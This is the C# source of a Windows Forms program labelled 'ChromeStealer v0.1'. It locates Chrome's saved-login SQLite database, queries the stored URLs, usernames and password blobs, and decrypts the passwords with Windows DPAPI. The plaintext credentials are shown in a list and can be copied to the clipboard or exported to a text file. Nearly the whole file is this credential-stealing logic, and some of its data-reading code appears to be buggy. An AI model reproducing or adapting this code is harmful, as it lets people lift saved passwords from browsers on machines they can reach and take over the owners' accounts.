using System;
using System.ComponentModel;
using System.Data;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Data.SQLite;
using System.IO;
using System.Diagnostics;

namespace chrstealer
{
    public partial class frmMain : Form
    {
        private string query = "SELECT origin_url, username_value, password_value FROM logins";
        private string sign = "======================================\r\n" +
                              "ChromeStealer v0.1\r\n" +
                              "Coded by: Thunder\r\n" +
                              "Blog: reversec0de.wordpress.com\r\n" +
                              "E-mail: yunietps@yahoo.com\r\n" +
                              "======================================\r\n\r\n";
        public frmMain()
        {
            InitializeComponent();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            lstDBData.Items.Clear();

            string chrome_db = GetChromeLoginsDB();
            if (string.IsNullOrEmpty(chrome_db))
            {
                MessageBox.Show("Seems that Google Chrome is not installed in this system.\r\n" +
                                "Please be sure before proceeding.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                return;
            }

            string sql_con = string.Format(@"Data Source={0};Version=3;New=False;Compress=True;", chrome_db);
            using (SQLiteConnection con = new SQLiteConnection(sql_con))
            {
                try
                {
                    con.Open();
                    SQLiteCommand cmd = new SQLiteCommand(con);
                    cmd.CommandText = query;
                    cmd.CommandType = CommandType.Text;
                    SQLiteDataReader reader = cmd.ExecuteReader();
                    int i = 0;
                    do
                    {
                        if (!string.IsNullOrEmpty(reader["username_value"].ToString()))
                        {
                            byte[] decrypted = ProtectedData.Unprotect((byte[])reader["password_value"], null, DataProtectionScope.LocalMachine);
                            lstDBData.Items.Add(reader["username_value"].ToString());
                            lstDBData.Items[i].SubItems.Add(Encoding.ASCII.GetString(decrypted));
                            lstDBData.Items[i].SubItems.Add(reader["origin_url"].ToString());
                            i++;
                        }
                    } while (reader.Read());

                }
                catch (SQLiteException ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }

            cmbSearchColumn.SelectedIndex = 0;
            if (lstDBData.Items.Count == 0)
                lstDBData.Items.Add("No Results Found...");
        }

        private string GetChromeLoginsDB()
        {
            
            string locadata_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString();
            string chrome_db = locadata_path + @"\Google\Chrome\User Data\Default\Login Data";
            if (File.Exists(chrome_db))
            {
                return chrome_db;
            }

            return string.Empty;
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmMain_Load(sender, e);
        }

        private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            frmMain_Load(sender, e);
        }

        private void goToURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string url = lstDBData.Items[lstDBData.SelectedItems[0].Index].SubItems[2].Text;
            Process.Start(url);
        }

        private void goToURLToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            goToURLToolStripMenuItem_Click(sender, e);
        }

        private void cmbSearchColumn_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = true;
        }

        private void txtSearch_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                if (txtSearch.Text == "")
                    frmMain_Load(sender, e);
                else
                    SearchTextInListView(lstDBData, txtSearch.Text, cmbSearchColumn.SelectedIndex);
            }
        }

        private void SearchTextInListView(ListView lst, string Search, int field = 0)
        {
            string iSearch = Search.ToLower();
            foreach (ListViewItem item in lst.Items)
            {
                if (field == 0)
                {
                    if (!item.Text.ToLower().Contains(iSearch))
                    {
                        item.Remove();
                    }
                }
                else
                {
                    if (!item.SubItems[field].Text.ToLower().Contains(iSearch))
                    {
                        item.Remove();
                    }
                }
            }

            if (lstDBData.Items.Count == 0)
                lstDBData.Items.Add("No Results Found...");
        }

        private void ExportToFile(ListView lv, string splitter)
        {
            string filename = "";
            SaveFileDialog sfd = new SaveFileDialog();

            sfd.Title = "Export to file";
            sfd.Filter = "Text File|*.txt";

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                filename = sfd.FileName.ToString();
                if (filename != "")
                {
                    using (StreamWriter sw = new StreamWriter(filename))
                    {
                        sw.WriteLine(sign);
                        foreach (ListViewItem item in lv.Items)
                        {
                            sw.WriteLine("Username: {0}\r\nPassword: {1}\r\nURL: {2}\r\n{3}", item.Text, item.SubItems[1].Text, item.SubItems[2].Text, splitter);
                        }
                    }
                }
            }
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void copyToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(sign + "Username: " + lstDBData.Items[lstDBData.SelectedItems[0].Index].Text + "\r\n" +
                              "Password: " + lstDBData.Items[lstDBData.SelectedItems[0].Index].SubItems[1].Text + "\r\n" +
                              "URL: " + lstDBData.Items[lstDBData.SelectedItems[0].Index].SubItems[2].Text);
            MessageBox.Show("Content successfully copied to clipboard!", "Copied",  MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            copyToolStripMenuItem1_Click(sender, e);
        }

        private void exportToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ExportToFile(lstDBData, "---------------------------------------------------------");
            MessageBox.Show("Content successfully exported to file!", "Copied", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void exportToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            exportToolStripMenuItem_Click(sender, e);
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmAbout about = new frmAbout();
            about.ShowDialog();
        }

        private void menuStrip1_MenuActivate(object sender, EventArgs e)
        {
            copyToolStripMenuItem1.Enabled = goToURLToolStripMenuItem1.Enabled = (lstDBData.SelectedItems.Count != 0);
        }

        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {
            copyToolStripMenuItem.Enabled = goToURLToolStripMenuItem.Enabled = (lstDBData.SelectedItems.Count != 0);
        }
    }
}
